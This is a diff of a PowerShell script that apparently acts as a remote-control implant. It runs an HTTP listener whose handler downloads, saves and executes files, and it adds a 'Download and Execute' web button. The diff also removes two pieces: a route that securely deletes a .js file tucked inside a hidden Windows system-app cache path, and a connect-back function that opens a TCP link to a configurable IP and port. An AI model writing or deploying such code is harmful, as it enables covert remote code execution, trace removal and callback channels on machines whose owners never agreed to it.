@@ -3,8 +3,8 @@ $ipAddress = "127.0.0.1"
 $port = 8080
 
 # IP address and port to connect back to
-$connectBackIp = "192.168.1.100" # Replace with your IP address
-$connectBackPort = 9090           # Replace with your port number
+$connectBackIp = "127.0.0.1"  # Updated IP address
+$connectBackPort = 9090        # Replace with your port number
 
 # Register HTTP listener with fixed IP and port
 $listener = New-Object System.Net.HttpListener
@@ -216,115 +216,55 @@ function Handle-Request {
                     # Execute the JavaScript file
                     Execute-Executable -filePath $finalFilePath
 
-                    $response.OutputStream.Write([System.Text.Encoding]::UTF8.GetBytes("File downloaded, saved as $finalFilePath, and executed."), 0, [System.Text.Encoding]::UTF8.GetBytes("File downloaded, saved as $finalFilePath, and executed.").Length)
-                }
-                '/0142' {
-                    $filePath = "C:\$WINDOWS.~BT\NewOS\Windows\SystemApps\Microsoft.Windows.Search_cw5n1h2txyewy\cache\Local\Desktop\40.js"
-
-                    # Securely delete the file
-                    SecureDelete -path $filePath
-
-                    $response.OutputStream.Write([System.Text.Encoding]::UTF8.GetBytes("File $filePath deleted."), 0, [System.Text.Encoding]::UTF8.GetBytes("File $filePath deleted.").Length)
+                    $response.OutputStream.Write([System.Text.Encoding]::UTF8.GetBytes("File downloaded, saved as $finalFilePath, and executed."), 0, [System.Text.Encoding]::UTF8.GetBytes("File downloaded, saved as $finalFilePath, and executed."))
                 }
                 default {
                     $response.StatusCode = 404
                     $response.StatusDescription = "Not Found"
                 }
             }
+        } else {
+            $response.StatusCode = 405
+            $response.StatusDescription = "Method Not Allowed"
         }
     } catch {
-        Write-Host "Error handling request: $_"
         $response.StatusCode = 500
         $response.StatusDescription = "Internal Server Error"
+        Write-Host "Error handling request: $_"
     } finally {
-        $response.Close()
+        $response.OutputStream.Close()
     }
 }
 
 # Function to serve HTML content
 function Serve-HTML {
-    param ([string]$Message)
-    $response = $context.Response
-    $html = @"
+    param (
+        [string]$Message
+    )
+    $htmlContent = @"
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Future Analysis</title>
-    <style>
-        body {
-            font-family: Arial, sans-serif;
-            background-color: #222;
-            color: #ddd;
-            margin: 0;
-            padding: 0;
-        }
-        .container {
-            max-width: 800px;
-            margin: 50px auto;
-            padding: 20px;
-            background-color: #333;
-            border-radius: 8px;
-            text-align: center;
-        }
-        h1 {
-            color: #fff;
-        }
-        button {
-            background-color: #555;
-            color: #ddd;
-            border: none;
-            padding: 10px 20px;
-            text-align: center;
-            text-decoration: none;
-            display: inline-block;
-            font-size: 16px;
-            margin: 4px 2px;
-            cursor: pointer;
-        }
-    </style>
+    <title>Action Menu</title>
 </head>
 <body>
-    <div class="container">
-        <h1>$Message</h1>
-    </div>
+    <h1>$Message</h1>
+    <form action="/0x67" method="post">
+        <button type="submit">Download and Execute</button>
+    </form>
 </body>
 </html>
 "@
-    $response.OutputStream.Write([System.Text.Encoding]::UTF8.GetBytes($html), 0, [System.Text.Encoding]::UTF8.GetBytes($html).Length)
+    $response.ContentType = "text/html"
+    $response.ContentEncoding = [System.Text.Encoding]::UTF8
+    $buffer = [System.Text.Encoding]::UTF8.GetBytes($htmlContent)
+    $response.OutputStream.Write($buffer, 0, $buffer.Length)
 }
 
-# Create a TCP connection back to the specified IP address and port
-function Connect-Back {
-    param (
-        [string]$ipAddress,
-        [int]$port
-    )
-
-    try {
-        $tcpClient = New-Object System.Net.Sockets.TcpClient
-        $tcpClient.Connect($ipAddress, $port)
-        Write-Host "Successfully connected back to $ipAddress:$port"
-
-        # Optionally send a message to the connected IP
-        $networkStream = $tcpClient.GetStream()
-        $writer = New-Object System.IO.StreamWriter($networkStream)
-        $writer.WriteLine("Connection established from PowerShell script.")
-        $writer.Flush()
-        $writer.Close()
-        $networkStream.Close()
-        $tcpClient.Close()
-    } catch {
-        Write-Host "Failed to connect back: $_"
-    }
-}
-
-# Start listening for HTTP requests
-while ($true) {
+# Main loop to handle incoming requests
+while ($listener.IsListening) {
     $context = $listener.GetContext()
     Handle-Request -context $context
 }
 
-# Establish a connection back to the specified IP and port
-Connect-Back -ipAddress $connectBackIp -port $connectBackPort
+$listener.Stop()
